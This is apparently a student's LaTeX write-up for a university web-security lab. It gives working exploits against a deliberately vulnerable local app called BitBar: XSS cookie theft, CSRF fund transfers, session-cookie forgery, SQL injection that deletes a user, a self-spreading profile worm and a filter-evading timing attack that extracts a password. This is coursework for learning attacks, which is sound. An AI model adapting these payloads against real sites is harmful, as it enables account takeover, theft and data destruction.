\documentclass[twoside,11pt]{article}
\setlength{\parindent}{0pt}

\usepackage{cs155}
\usepackage{lipsum}
\usepackage{listings}
\usepackage{amsmath}

\usepackage[utf8]{inputenc}
\usepackage{textcomp}
\DeclareUnicodeCharacter{00B1}{\ifmmode\pm\else\textpm\fi}
\usepackage{listingsutf8}
\usepackage{mdframed}
\usepackage{xcolor}
%%
%% Julia syntax highlighting (c) Robert Moss
%%
\lstdefinelanguage{Julia}%
  {keywords=[2]{Tuple, flush, primes, Type, flush_cstdio, print, TypeConstructor, foldl, print_escaped, TypeError, foldr, print_joined, TypeName, print_shortest, TypeVar, frexp, print_unescaped, UTF16String, full, print_with_color, UTF32String, fullname, println, UTF8String, process_exited, UdpSocket, functionloc, process_running, Uint, functionlocs, procs, Uint128, gamma, prod, Uint16, gc, prod!, Uint32, gc_disable, produce, Uint64, gc_enable, promote, Uint8, gcd, promote_rule, UndefRefError, gcdx, promote_shape, UndefVarError, gensym, promote_type, UniformScaling, get, push!, Union, get!, pushdisplay, UnionType, get_bigfloat_precision, put, UnitRange, get_bigfloat_rounding, put!, Unsigned, get_rounding, pwd, VERSION, getaddrinfo, qr, Vararg, getfield, qrfact, VecOrMat, gethostname, qrfact!, Vector, getindex, quadgk, VersionNumber, getipaddr, quantile, Void, getkey, quantile!, WORD_SIZE, getpid, quit, WString, givens, WeakKeyDict, global, rad2deg, WeakRef, golden, radians2degrees, WindowsRawSocket, gperm, rand, Woodbury, gradient, rand!, Zip, hankelh1, randbool, hankelh1x, randbool!, hankelh2, randcycle, abs, hankelh2x, randn, abs2, hash, randn!, abspath, haskey, randperm, hcat, randstring, accept, help, randsubseq, @MIME, acos, hessfact, randsubseq!, @MIME_str, acosd, hessfact!, range, @__FILE__, acosh, hex, rank, @allocated, acot, hex2bytes, rationalize, @assert, acotd, hex2num, read, @async, acoth, hist, read!, @b_str, acsc, hist2d, readall, @bigint_str, acscd, histrange, readandwrite, @boundscheck, acsch, homedir, readavailable, @cmd, addprocs, htol, readbytes, @code_llvm, airy, hton, readbytes!, @code_lowered, airyai, hvcat, readchomp, @code_native, airyaiprime, hypot, readcsv, @code_typed, airybi, iceil, readdir, @deprecate, airybiprime, idct, readdlm, @edit, airyprime, idct!, readline, @elapsed, airyx, identity, readlines, @eval, all, readsfrom, @evalpoly, all!, ifelse, readuntil, @everywhere, angle, ifft, real, @fetch, ans, ifft!, realmax, @fetchfrom, any, ifftshift, realmin, @gensym, any!, ifloor, realpath, @goto, append!, ignorestatus, recv, @inbounds, applicable, im, redirect_stderr, @int128_str, apply, imag, redirect_stdin, @ip_str, apropos, redirect_stdout, @label, ascii, redisplay, @less, asec, reduce, @linux, asecd, in, reducedim, @linux_only, asech, include, reenable_sigint, @mstr, asin, include_string, reim, @non_windowsxp_only, asind, ind2chr, reinterpret, @osx, asinh, ind2sub, reload, @osx_only, assert, indexin, rem, @parallel, atan, indexpids, rem1, @printf, atan2, indmax, remotecall, @profile, atand, indmin, remotecall_fetch, @r_mstr, atanh, inf, remotecall_wait, @r_str, atexit, info, repeat, @schedule, backtrace, infs, replace, @show, baremodule, insert!, repmat, @simd, base, int, repr, @spawn, base64, int128, reprmime, @spawnat, basename, int16, require, @sprintf, int32, reset, @sync, beginswith, int64, reshape, @task, besselh, int8, resize!, @thunk, besseli, integer, rethrow, @time, besselix, interrupt, @timed, besselj, intersect, reverse, @uint128_str, besselj0, intersect!, reverse!, @unexpected, besselj1, inv, rfft, @unix, besseljx, invdigamma, rm, @unix_only, besselk, invmod, rmdir, @v_str, besselkx, invoke, rmprocs, @vectorize_1arg, bessely, invperm, rol, @vectorize_2arg, bessely0, ipermute!, ror, @which, bessely1, ipermutedims, rot180, @windows, besselyx, irfft, rotl90, @windows_only, beta, iround, rotr90, @windowsxp_only, bfft, is, round, ANY, bfft!, is_assigned_char, rpad, ARGS, big, is_valid_ascii, rref, ASCIIString, bin, is_valid_char, rsearch, A_ldiv_B!, bind, is_valid_utf16, rsearchindex, A_ldiv_Bc, binomial, is_valid_utf8, rsplit, A_ldiv_Bt, bitbroadcast, isa, rstrip, A_mul_B!, bitmix, isabspath, run, A_mul_Bc, bitpack, isalnum, scale, A_mul_Bc!, bits, isalpha, scale!, A_mul_Bt, bitstype, isapprox, schedule, A_mul_Bt!, bitunpack, isascii, schur, A_rdiv_Bc, bkfact, isbits, schurfact, A_rdiv_Bt, bkfact!, isblank, schurfact!, AbstractArray, blas_set_num_threads, isblockdev, sdata, AbstractMatrix, blkdiag, ischardev, search, AbstractRNG, bool, iscntrl, searchindex, AbstractSparseArray, break, isconst, searchsorted, AbstractSparseMatrix, brfft, isdefined, searchsortedfirst, AbstractSparseVector, broadcast, isdigit, searchsortedlast, AbstractVecOrMat, broadcast!, isdir, sec, AbstractVector, broadcast!_function, isdirpath, secd, Ac_ldiv_B, broadcast_function, iseltype, sech, Ac_ldiv_Bc, broadcast_getindex, isempty, seek, Ac_mul_B, broadcast_setindex!, isequal, seekend, Ac_mul_B!, bswap, iseven, seekstart, Ac_mul_Bc, bytes2hex, isexecutable, select, Ac_mul_Bc!, bytestring, isfifo, select!, Ac_rdiv_B, c_calloc, isfile, send, Ac_rdiv_Bc, c_free, isfinite, serialize, Any, c_malloc, isgeneric, set_bigfloat_precision, ArgumentError, c_realloc, isgraph, set_bigfloat_rounding, Array, cartesianmap, ishermitian, set_rounding, Associative, cat, isimmutable, setdiff, At_ldiv_B, catalan, isinf, setdiff!, At_ldiv_Bt, isinteger, setenv, At_mul_B, catch_backtrace, isinteractive, setfield, At_mul_B!, cbrt, isleaftype, setfield!, At_mul_Bt, ccall, isless, setindex!, At_mul_Bt!, cd, islink, shift!, At_rdiv_B, ceil, islower, show, At_rdiv_Bt, cell, ismarked, showall, BLAS, cfunction, ismatch, showcompact, Base, cglobal, isnan, showerror, Base64Pipe, char, isodd, shuffle, Bidiagonal, charwidth, isopen, shuffle!, BigFloat, checkbounds, ispath, sign, BigInt, chmod, isperm, signbit, BitArray, chol, isposdef, signed, BitMatrix, cholfact, isposdef!, signif, BitVector, cholfact!, ispow2, significand, Bool, chomp, isprime, similar, BoundsError, chop, isprint, sin, Box, chr2ind, ispunct, sinc, ByteString, circshift, isqrt, sind, CFILE, cis, isreadable, sinh, CPU_CORES, clamp, isreadonly, sinpi, C_NULL, clear_malloc_data, isready, size, Cchar, clipboard, isreal, sizehint, Cdouble, close, issetgid, sizeof, Cfloat, cmp, issetuid, skip, Char, code_llvm, issocket, skipchars, CharString, code_lowered, issorted, sleep, Cint, code_native, isspace, slice, Clong, code_typed, issparse, slicedim, Clonglong, collect, issticky, sort, ClusterManager, colon, issubnormal, sort!, Cmd, combinations, issubset, sortcols, Coff_t, complement, issubtype, sortperm, Collections, complement!, issym, sortrows, Colon, complex, istaskdone, sparse, Complex, complex128, istext, sparsevec, Complex128, complex32, istril, spawn, Complex32, complex64, istriu, spdiagm, Complex64, cond, isupper, speye, Condition, condskeel, isvalid, splice!, Core, conj, iswritable, split, Cptrdiff_t, conj!, isxdigit, splitdir, Cshort, connect, itrunc, splitdrive, Csize_t, join, splitext, Cssize_t, consume, joinpath, spones, Cuchar, contains, keys, sprand, Cuint, kill, sprandbool, Culong, conv, kron, sprandn, Culonglong, conv2, last, sprint, Cushort, convert, lbeta, spzeros, Cwchar_t, copy, lcfirst, sqrt, DArray, copy!, lcm, sqrtm, DL_LOAD_PATH, copysign, ldexp, squeeze, DataType, cor, ldltfact, srand, DenseArray, cos, ldltfact!, start, DenseMatrix, cosc, leading_ones, start_reading, DenseVecOrMat, cosd, leading_zeros, start_timer, DenseVector, cosh, length, start_watching, DevNull, cospi, less, stat, Diagonal, cot, let, std, Dict, cotd, lexcmp, stdm, DimensionMismatch, coth, lexless, step, Dims, count, lfact, stop_reading, DirectIndexString, count_ones, lgamma, stop_timer, Display, count_zeros, linrange, strerror, DivideError, countlines, linreg, strftime, DomainError, countnz, linspace, stride, ENDIAN_BOM, cov, listen, strides, ENV, cp, listenany, string, EOFError, cross, local, stringmime, EachLine, csc, localindexes, strip, Enumerate, cscd, localpart, strptime, ErrorException, csch, log, strwidth, Exception, ctime, log10, sub, Expr, ctranspose, log1p, sub2ind, FFTW, cummax, log2, subtypes, Factorization, cummin, logdet, success, FileMonitor, cumprod, logspace, sum, FileOffset, cumprod!, lowercase, sum!, Filter, cumsum, lpad, sum_kbn, Float16, cumsum!, lstat, sumabs, Float32, cumsum_kbn, lstrip, sumabs!, Float64, current_module, ltoh, sumabs2, FloatRange, current_task, lu, sumabs2!, FloatingPoint, dawson, lufact, summary, Function, dct, lufact!, super, GetfieldNode, dct!, lyap, svd, GotoNode, dec, svdfact, Graphics, deconv, macroexpand, svdfact!, Hermitian, deepcopy, map, svdvals, I, deg2rad, map!, svdvals!, IO, degrees2radians, mapreduce, sylvester, IOBuffer, delete!, mapslices, symbol, IOStream, deleteat!, mark, symdiff, IPv4, den, match, symdiff!, IPv6, dense, matchall, symlink, InexactError, deserialize, max, symperm, Inf, det, maxabs, systemerror, Inf16, detach, maxabs!, take, Inf32, dfill, maximum, take!, InsertionSort, diag, maximum!, takebuf_array, Int, diagind, maxintfloat, takebuf_string, Int128, diagm, mean, tan, Int16, diff, mean!, tand, Int32, digamma, median, tanh, Int64, digits, median!, task_local_storage, Int8, dirname, merge, tempdir, IntSet, disable_sigint, merge!, tempname, Integer, display, method_exists, throw, InterruptException, displayable, methods, tic, IntrinsicFunction, distribute, methodswith, time, Intrinsics, div, middle, time_ns, JULIA_HOME, divrem, midpoints, timedwait, KeyError, dlclose, mimewritable, toc, LAPACK, dlopen, min, toq, LOAD_PATH, dlopen_e, minabs, touch, LabelNode, dlsym, minabs!, trace, LambdaStaticData, dlsym_e, minimum, trailing_ones, LineNumberNode, minimum!, trailing_zeros, LoadError, done, minmax, transpose, LocalProcess, dones, mkdir, trigamma, MIME, dot, mkpath, tril, MS_ASYNC, download, mktemp, tril!, MS_INVALIDATE, drand, mktempdir, triu, MS_SYNC, drandn, mmap, triu!, MathConst, dump, mmap_array, trues, Matrix, dzeros, mmap_bitarray, trunc, MemoryError, mod, truncate, MergeSort, eachline, mod1, MersenneTwister, eachmatch, mod2pi, tuple, Meta, edit, modf, Method, eig, MethodError, eigfact, module_name, typeintersect, MethodTable, eigfact!, module_parent, typejoin, Module, eigmax, msync, typemax, NTuple, eigmin, mtime, typemin, NaN, eigs, mv, typeof, NaN16, eigvals, myid, ucfirst, NaN32, eigvecs, myindexes, uint, NewvarNode, names, uint128, None, nan, uint16, Nothing, eltype, nans, uint32, Number, empty!, nb_available, uint64, OS_NAME, ndigits, uint8, ObjectIdDict, endof, ndims, unescape_string, Operators, endswith, next, union, OrdinalRange, enumerate, nextfloat, union!, OverflowError, eof, nextind, unique, ParseError, eps, nextpow, unmark, PipeBuffer, erf, nextpow2, unsafe_copy!, Pkg, erfc, nextprod, unsafe_load, PollingFileWatcher, erfcinv, nfilled, unsafe_pointer_to_objref, ProcessExitedException, erfcx, nnz, unsafe_store!, ProcessGroup, erfi, nonzeros, unshift!, Profile, erfinv, norm, unsigned, Ptr, errno, normalize_string, uperm, QuickSort, error, normfro, uppercase, QuoteNode, esc, normpath, RTLD_DEEPBIND, escape_string, nothing, utf16, RTLD_FIRST, eta, notify, utf32, RTLD_GLOBAL, etree, nprocs, utf8, RTLD_LAZY, eu, nthperm, values, RTLD_LOCAL, eulergamma, nthperm!, var, RTLD_NODELETE, eval, ntoh, varm, RTLD_NOLOAD, evalfile, ntuple, vcat, RTLD_NOW, exit, null, vec, Range, exp, num, vecnorm, Range1, exp10, num2hex, versioninfo, RangeIndex, exp2, nworkers, wait, Ranges, expand, object_id, warn, Rational, expanduser, oct, watch_file, RawFD, expm, oftype, which, Real, expm1, one, Regex, exponent, ones, whos, RegexMatch, open, widemul, RemoteRef, extrema, operm, widen, RepString, eye, parent, with_bigfloat_precision, RevString, factor, parentindexes, with_bigfloat_rounding, RopeString, factorial, parse, with_rounding, RoundDown, factorize, parsefloat, workers, RoundFromZero, falses, parseint, workspace, RoundNearest, fd, parseip, write, RoundToZero, fdio, partitions, writecsv, RoundUp, fetch, peakflops, writedlm, RoundingMode, fft, permutations, writemime, STDERR, fft!, permute!, writesto, STDIN, fftshift, permutedims, wstring, STDOUT, fieldoffsets, permutedims!, xcorr, Set, fieldtype, pi, xdump, SharedArray, filemode, pinv, yield, SharedMatrix, filesize, plan_bfft, yieldto, SharedVector, fill, plan_bfft!, zero, Signed, fill!, plan_brfft, zeros, SparseMatrixCSC, filt, plan_dct, zeta, StackOverflowError, filt!, plan_dct!, zip, Stat, filter, plan_fft, StatStruct, filter!, plan_fft!, StepRange, finalizer, plan_idct, StridedArray, finally, plan_idct!, StridedMatrix, find, plan_ifft, StridedVecOrMat, find_library, plan_ifft!, StridedVector, findfirst, plan_irfft, String, findin, plan_rfft, SubArray, findmax, pmap, SubDArray, findmin, pointer, SubOrDArray, findn, pointer_from_objref, SubString, findnext, pointer_to_array, SymTridiagonal, findnz, poll_fd, Symbol, first, poll_file, SymbolNode, fld, polygamma, Symmetric, flipbits!, pop!, Sys, flipdim, popdisplay, SystemError, fliplr, position, Task, flipsign, powermod, Test, flipud, precision, TextDisplay, float, precompile, Timer, float16, prepend!, TmStruct, float32, prevfloat, Top, float32_isvalid, prevind, TopNode, float64, prevpow, Triangular, float64_isvalid, prevpow2, Tridiagonal, floor, prevprod},%
   keywords=[1]{abstract,begin,break,catch,const,continue,do,else,elseif,%
      end,export,false,for,function,immutable,import,importall,if,in,%
      macro,module,otherwise,quote,return,switch,true,try,type,typealias,%
      using,while, mutable, struct, immutable},
   sensitive=true,%
   alsoother={\$},%
   morecomment=[l]\#,%
   morecomment=[n]{\#=}{=\#},%
   morestring=[s]{"}{"},%
   morestring=[m]{'}{'},%
   alsoletter=!?,
}[keywords,comments,strings]%
\definecolor{backcolor}{rgb}{0.98,0.98,0.98}
\definecolor{numbergray}{rgb}{0.5,0.5,0.5}
\definecolor{stanfordred}{RGB}{140,21,21}
\definecolor{paloalto}{RGB}{23,94,84}
\definecolor{lagunita}{RGB}{0,124,146}
\definecolor{darkgreen}{RGB}{21,140,21}
\definecolor{darkblue}{RGB}{21,21,140}
\definecolor{sun}{RGB}{234,171,0}
\lstset{%
    language         = Julia,
    backgroundcolor  = \color[HTML]{F2F2F2},
    basicstyle       = \small\ttfamily\color[HTML]{19177C},
    numberstyle      = \ttfamily\scriptsize\color[HTML]{7F7F7F},
    keywordstyle     = \bfseries\color[HTML]{1BA1EA},
    keywordstyle     = [2]{\color[HTML]{0F6FA3}},
    keywordstyle     = [3]{\color[HTML]{0000FF}},
    stringstyle      = \color[HTML]{F5615C},
    commentstyle     = \color[HTML]{AAAAAA},
    frame=none,                 % A frame around the code
    tabsize=4,                  % Default tab size
    captionpos=b,               % Caption-position = bottom
    breaklines=true,            % Automatic line breaking
    breakatwhitespace=false,    % Automatic breaks only at whitespace?
    showstringspaces=false,     % Don't make spaces visible in strings
    showspaces=false,           % Don't make spaces visible elsewhere
    showtabs=false,             % Don't make tabs visible
    columns=fullflexible,       % Column format
    keepspaces=true,            % Keep spaces in code
    numbers=none,               % Line numbers
    numbersep=5pt,              % Line number separation
    % inputencoding=ansinew,
    inputencoding=utf8,
    extendedchars=true,
    literate={±}{{\textpm}}1
             {τ}{{$\tau$}}1
             {\{}{{\color[HTML]{0F6FA3}\{}}1
             {\}}{{\color[HTML]{0F6FA3}\}}}1
}
\newenvironment{algorithm}[1][htbp]
{\begin{mdframed}[backgroundcolor=black!5,rightline=false,leftline=false,innerbottommargin=0pt,innertopmargin=0pt,innerleftmargin=15pt,skipabove=4pt]}
{\end{mdframed}}


\begin{document}

% Refer to this link for project rubric: https://web.stanford.edu/class/aa228/cgi-bin/wp/project-1/
\title{Project 2: Web Attacks \& Defenses}

%===========================================
% TODO: Replace "First Last" with your name.
% TODO: Replace "email@stanford.edu" with your Stanford email.
%===========================================
\name{Julian Cooper}
\email{jelc@stanford.edu}


\maketitle


\section{Alpha: Cookie Thefit}
%===========================================
% TODO: Replace this with a short description of your algorithm(s) used.
Idea: Attacker has access to some part of the BitBar user profile webpage and wants
to insert a link to url that steals the user's cookie, but otherwise appears to just 
refresh the page.\\

Exploit: We need to specify the url that our user would click to execute the cookie theft.

\begin{verbatim}
http://localhost:3000/profile?username=<p hidden>
<script>
    var xhr = new XMLHttpRequest();
    var url = 'http://localhost:3000/steal_cookie?cookie='%2B document.cookie; 
    xhr.open("GET", url); 
    xhr.send();
</script>     
\end{verbatim}

Working notes:
\begin{itemize}
    \item Recognize we can insert \verb+http://localhost:3000/profile?username=<valid user>+ and switch between user profiles after logged in. If the username given is invalid, it produces an error message that we want to avoid. We do this by passing \verb+<p hidden>+ (without closing html tag) to hide the long script we are passing to the username field.
    \item Open a GET request to the localhost:3000 url and pass \texttt{steal\_cookie} key with cookie information from the DOM included as the value. Note, we will need to pass the bulk of the url as a string, except the document.cookie fucntion call which we can concatenate with \verb+''%2Bcookie+, \verb+''\+cookie+, or \verb+''.concat(cookie)+.
    \item Declare two the two variables we need to execute this: xhr (our \texttt{HttpRequest()} variable) and url to send request to. Finally, send GET request to url we have specified. We should see the session cookie printed in plaintext from the network terminal.
\end{itemize}
%===========================================


\section{Bravo: Cross-Site Request Forgery}
%===========================================
% TODO: Replace this with a short description of your algorithm(s) used.
Idea: Attacker builds a website wants to build a malicious website which (when visited) steals some Bitbar from another user.
After the theft, the user is redirected to \verb+https://cs155.stanford.edu+.\\

Exploit: We need to design a self-contianed HTML page (\texttt{b.html}) that sends a 
post transfer request to the BitBar server with our logged in user credentials and 
appropriate header.

\begin{verbatim}
<script>
    var args = "destination_username=attacker&quantity=10";
    var xhr = new XMLHttpRequest();
    xhr.withCredentials = true;
    xhr.onload = () => window.location="https://cs155.stanford.edu/";
    xhr.open("POST", "http://localhost:3000/post_transfer"); 
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send(send_args);
</script>
\end{verbatim}

Working notes:
\begin{itemize}
    \item Open a new http post request to \verb+http://localhost:3000/post_transfer+ and prepare send arguments: \texttt{destination\_username} and \texttt{quantity=10}.
    \item Set with credentials to true to allow cookies to be sent with request and set request header to \verb+x-www-form-urlencoded+ to specify the type of data we are sending (\&, =).
    \item Redirect user to \verb+https://cs155.stanford.edu/+ after the request is sent using onload function call.
\end{itemize}
%===========================================


\section{Charlie: Session Hijacking with Cookies}
%===========================================
% TODO: Replace this with a short description of your algorithm(s) used.
Idea: Want to trick Bitbar server into thinking you are logged in as a different
user by hijacking the victim's session cookie. \\

Exploit: Start attack logged in as \texttt{attacker} and execute script in browser
console to trick Bitbar into switching you onto \texttt{user1}'s account from which 
you can use the web UI to transfer 10 Bitbar to \texttt{attacker}.

\begin{verbatim}
    var sessObj = JSON.parse(atob(document.cookie.substring(8)));
    sessObj.account.username = "user1";
    sessObj.account.bitbars = 200;
    document.cookie = "session=" + btoa(JSON.stringify(sessObj));
\end{verbatim}

Working notes:
\begin{itemize}
    \item Recognize that session cookie is stored in the DOM as ascii (base64) and can be accessed from the browser console. Isolate session cookie ascii using substring() function, convert from base64 to binary string and use JSON.parse() to convert into a Javascript object. Assign session cookie object to new variable \texttt{sessObj}.
    \item Change the username and bitbars fields of the session cookie object to the desired values. Convert back to base64 string using JSON.stringify() and btoa() functions. 
    \item Finally, reassign document.cookie to new session cookie string and reload the page. We should now be recognized as \texttt{user1} and able to navigate to transfer page and pay \texttt{attacker} 10 Bitbar.
    
\end{itemize}
%===========================================


\section{Delta: Cooking the Books with Cookies}
%===========================================
% TODO: Replace this with a short description of your algorithm(s) used.
Idea: Want to forge 1 million new Bitbar rather than steal from other users.  \\

Exploit: Begin attack by creating a new user and insert Javascript commands into the 
console such that after a small initial transaction, our new user's balance jumps up 
to 1 million Bitbar.

\begin{verbatim}
    var sessObj = JSON.parse(atob(document.cookie.substring(8)));
    sessObj.account.bitbars = 1e6 + 1;
    document.cookie = "session="+btoa(JSON.stringify(sessObj));
\end{verbatim}

Working notes: identical strategy and function calls to exploit charlie. We end up with 
1e6 + 1 Bitbar in our account \emph{before} reloading the page and exactly 1e6 after a transfer 
of 1 Bitbar to any other valid user.
%===========================================


\section{Echo: SQL Injection}
%===========================================
% TODO: Replace this with a short description of your algorithm(s) used.
Idea: Want to execute malicious SQL against the backend database that powers 
the Bitbar application. In particular, we want to remove another user (\texttt{user3}) 
from the app's database.\\

Exploit: Design a username that executes malicious SQL when the grader attempts 
to create a new user account with your provided username. \\

Recall the app's account close routine constructs SQL statements with user input:
\begin{verbatim}
router.get('/close', asyncMiddleware(async (req, res, next) => {
    if(req.session.loggedIn == false) {
        render(req, 
               res, 
               next, 
               'login/form', 
               'Login', 
               'You must be logged in to use this feature!');
        return;
    };
    const db = await dbPromise;
    const query = `DELETE FROM Users WHERE username == "${req.session.account.username}";`;
    await db.get(query);
    req.session.loggedIn = false;
    req.session.account = {};
    render(req, res, next, 'index', 'Bitbar Home', 'Deleted account successfully!');
}));
\end{verbatim}

We provide the following statement as our new user's username:
\begin{verbatim}
    " OR username == "user3
\end{verbatim}

Working notes:
\begin{itemize}
    \item The SQL statement that is executed is of the form: \texttt{DELETE FROM Users WHERE username == "" OR username == "user3";}.
    \item The first part of the statement deletes the user with the username \texttt{""} (empty string) which is the user that is currently logged in. 
    \item The second part fohe boolean resolves to be true for "user3" and so remove login information for that user as well.
\end{itemize}
%===========================================


\section{Foxtrot: Profile Worm}
%===========================================
Idea: Want to develop a Worm that steals Bitbar \emph{and} spreads 
to other accounts. \\

Exploit: To do this, we want to construct a malicious profile that, 
when visited, transfers 1 Bitbar from the logged-in user (e.g. \texttt{user1}) to the attacker 
and replaces the profile of the current user with itself. When a subseuqent user (e.g. \texttt{user2}) 
visitied \texttt{user1}'s profile, the same malicious script is executed and the worm spreads. 

\begin{verbatim}
<span id="bitbar_count" class="10"/>
<script>
    // PART 1: steal one bitbar
	var xhr1 = new XMLHttpRequest();
	xhr1.open('POST', 'http://localhost:3000/post_transfer');

	xhr1.withCredentials = true;
	xhr1.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	
	var args1 = 'destination_username=attacker&quantity=1';

	// PART 2: change their profile

	// step 1: find text content of the profile we're currently viewing in DOM
	// the form in profile/view.ejs
	let viewingProfile = document.getElementById('profile').innerHTML;

	xhr1.onload = function() {
		// step 2: send second post request
		// JS equivalent of hitting the "Update profile" button
		var xhr2 = new XMLHttpRequest();
		xhr2.open('POST', 'http://localhost:3000/set_profile');
		xhr2.withCredentials = true;

		// urlencoded is just a type of encoding, doesn't mean it's stored in url
		xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

		var reqBody = 'new_profile=' + encodeURIComponent(viewingProfile);

		xhr2.onload = function() {
			let elem = document.getElementById("bitbar_display");
			elem.innerHTML = "10 bitbars";
		}

		xhr2.send(reqBody);
	}

	xhr1.send(args1);
</script>
\end{verbatim}

Working notes:
\begin{itemize}
    \item The first part of the exploit steals one bitbar as in exploit Bravo
    \item That is, it uses CSRF to send a request to the \texttt{/post\_transfer} endpoint, with attacker as its user destination
    \item The second part of the exploit implements the worm behavior by copying over the text of the profile that is being viewed to the user's own profile
    \item A final feature of the exploit is that, after the new profile is loaded, it doesn't show the true bitbar count but it shows 10 bitbars
    \item It does so by setting that \<p\> tag's innerHTML to "10 bitbars", and by adding a \<span\> element to prevent the JS that handles the counting animation from overwriting it.
    \item That piece of JS code only counts up to the integer represented by the class property of the \<span\> element with id "bitbar\_count".
\end{itemize}
%===========================================


\section{Gamma: Password Extraction via Timing Attack}
%===========================================
% TODO: Replace this with a short description of your algorithm(s) used.
Idea: Measure how long it takes for the server to respond to login attempts with different passwords 
to deduce which password is the correct one. Hint: it's the password that causes about a 4x increase
in the server's response time.\\

Exploit: Insert JS in the username field to send login requests trying each of the passwords in the
provided dictionary. Then send the password of the one that took the longest to the attacker-controlled
\texttt{steal\_password} endpoint.

\begin{verbatim}
<span style='display:none'>
  <iMg id='test'/>
  <scRIPt>
    var dictionary = [`password`, `123456`, `12345678`, `dragon`, `1234`, `qwerty`, `12345`];
    var dictLen = dictionary.length;

    var index = 0;
    var currPasswd = dictionary[index];
    
    var slowestPwdTime = -1;
    var bestGuess;

    var test = document.getElementById(`test`);

    test.onerror = () => {
      var end = new Date();

      if (index < dictLen) {
        var duration = end-start;

        if (duration > slowestPwdTime) {
            bestGuess = currPasswd;
            slowestPwdTime = duration;
        }
        
        index += 1;
        currPasswd = dictionary[index];

        start = new Date();
        test.src = `http://localhost:3000/get_login?username=userx&password=` + currPasswd;
      } else {
        var url = `http://localhost:3000/steal_password?password=` + bestGuess + `&timeElapsed=` + slowestPwdTime;
        
        var xhr = new XMLHttpRequest();
        xhr.open(`GET`, url);
        xhr.send();
      }
    };

    var start = new Date();

    test.src = `http://localhost:3000/get_login?username=userx&password=` + currPasswd;

    index += 1;
    currPasswd = dictionary[index];
  </scRIPt> 
</span>
\end{verbatim}

Working notes:
\begin{itemize}
    \item When \texttt{test.src} is set, it leads to \texttt{onerror()} being called (asked TAs and they're unsure why, seems like valid request).
    \item It then loops on the \texttt{onerror()} function until every word in the dictionary has been tried (the \texttt{img.src} in \texttt{onerror()} leads it to loop)
    \item Each iteration, it tries a different password and records the time it takes server
    \item Once it tried all of them, it sends its best guess (simply the password that took the longest to solicit response) to an attacker-controlled endpoint
    \item To escape the server's attempts to get rid of \texttt{script} and \texttt{img} tags, it mixes in capitalized letters into the HTML tags
    \item HTML is case insensitive so HTML still reads them correctly, but they no longer match the server code's regex so they're not removed.
\end{itemize}
%===========================================


%===========================================
% EXAMPLE IMAGE, TODO REPLACE WITH YOUR IMAGE
%===========================================
% \begin{figure}[h]
%     \centering
%     \includegraphics[width=0.4\textwidth]{example_graph.pdf}
%     \caption{Graph caption.}
% \end{figure}

%===========================================
% EXAMPLE PYTHON, TODO REPLACE WITH YOUR CODE:
%===========================================
% \begin{algorithm}
% \begin{lstlisting}
% import sys

% import networkx


% def write_gph(dag, idx2names, filename):
%     with open(filename, 'w') as f:
%         for edge in dag.edges():
%             f.write("{}, {}\n".format(idx2names[edge[0]], idx2names[edge[1]]))


% def compute(infile, outfile):
%     # WRITE YOUR CODE HERE
%     # FEEL FREE TO CHANGE ANYTHING ANYWHERE IN THE CODE
%     # THIS INCLUDES CHANGING THE FUNCTION NAMES, MAKING THE CODE MODULAR, BASICALLY ANYTHING
%     pass


% def main():
%     if len(sys.argv) != 3:
%         raise Exception("usage: python project1.py <infile>.csv <outfile>.gph")

%     inputfilename = sys.argv[1]
%     outputfilename = sys.argv[2]
%     compute(inputfilename, outputfilename)


% if __name__ == '__main__':
%     main()

% \end{lstlisting}
% \end{algorithm}

\end{document}
